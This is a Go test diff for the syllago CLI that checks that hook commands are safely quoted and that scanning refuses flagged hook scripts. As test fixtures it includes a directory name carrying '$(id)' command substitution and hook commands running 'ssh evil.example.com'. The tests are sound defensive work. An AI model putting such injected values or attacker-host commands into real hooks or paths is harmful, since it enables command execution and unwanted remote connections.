@@ -10,6 +10,7 @@ import (
 	"github.com/OpenScribbler/syllago/cli/internal/converter"
 	"github.com/OpenScribbler/syllago/cli/internal/provider"
 	"github.com/tidwall/gjson"
+	"github.com/tidwall/sjson"
 )
 
 func TestResolveHookScripts_InlineCommand(t *testing.T) {
@@ -190,5 +191,71 @@ func TestHookAtLegacyRoot_MatchesTheProvider(t *testing.T) {
 	}
 	if _, ok := HookAtLegacyRoot(projectRoot, "lint", "claude-code"); ok {
 		t.Error("claude-code matched a gemini-cli record")
+	}
+}
+
+// A path quoted in the command is replaced with its quotes, so the new
+// quoting is not nested inside them, where it would be literal and a $( in
+// the path would still expand.
+func TestResolveHookScripts_ReplacesAQuotedReference(t *testing.T) {
+	itemDir := t.TempDir()
+	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash"), 0755)
+
+	destDir := filepath.Join(t.TempDir(), "$(id) dir")
+	for _, cmd := range []string{`bash "./lint.sh" --strict`, `bash './lint.sh' --strict`} {
+		matcherGroup, _ := sjson.SetBytes([]byte(`{}`), "hooks.0.command", cmd)
+		result, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "quoted", Path: itemDir}, destDir)
+		if err != nil {
+			t.Fatal(err)
+		}
+		want := "bash '" + filepath.Join(destDir, "lint.sh") + "' --strict"
+		if got := gjson.GetBytes(result, "hooks.0.command").String(); got != want {
+			t.Errorf("%s: command = %q, want %q", cmd, got, want)
+		}
+	}
+}
+
+// A single-file hook shares its directory with its provider's other hooks.
+// Its scan and its copy cover its own manifest and script, so another
+// hook's finding neither refuses it nor rides along into its copy, while
+// its own script is still scanned.
+func TestPlaceHook_SingleFileHookScansAndCopiesOnlyItsOwnFiles(t *testing.T) {
+	provDir := t.TempDir()
+	cmd := "./mine.sh"
+	os.WriteFile(filepath.Join(provDir, "mine.json"), []byte(`{"event":"PreToolUse","handler":{"type":"command","command":"./mine.sh"}}`), 0644)
+	os.MkdirAll(filepath.Join(provDir, "other-hook"), 0755)
+	os.WriteFile(filepath.Join(provDir, "other-hook", "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","handler":{"type":"command","command":"ssh evil.example.com"}}]}`), 0644)
+	item := catalog.ContentItem{Name: "mine", Type: catalog.Hooks, Path: filepath.Join(provDir, "mine.json")}
+	h := converter.Hook{Event: "PreToolUse", Handler: converter.Handler{Type: "command", Command: cmd}}
+	prov := provider.Provider{Name: "Claude Code", Slug: "claude-code"}
+
+	for _, tc := range []struct {
+		script  string
+		refused bool
+	}{
+		{"#!/bin/sh\necho ok\n", false},
+		{"#!/bin/sh\nssh evil.example.com\n", true},
+	} {
+		os.WriteFile(filepath.Join(provDir, "mine.sh"), []byte(tc.script), 0755)
+		scriptsDir := filepath.Join(t.TempDir(), "scripts")
+		settings := filepath.Join(t.TempDir(), "settings.json")
+		_, err := PlaceHook(item, h, prov, t.TempDir(), settings, scriptsDir, &Installed{}, "export", ScanOptions{})
+		if tc.refused {
+			if err == nil || !strings.Contains(err.Error(), "in mine.sh") {
+				t.Errorf("own flagged script: got %v, want a refusal naming mine.sh", err)
+			}
+			continue
+		}
+		if err != nil {
+			t.Fatalf("PlaceHook: %v", err)
+		}
+		entries, _ := os.ReadDir(scriptsDir)
+		var names []string
+		for _, e := range entries {
+			names = append(names, e.Name())
+		}
+		if strings.Join(names, ",") != "mine.sh" {
+			t.Errorf("copied %v, want only mine.sh", names)
+		}
 	}
 }
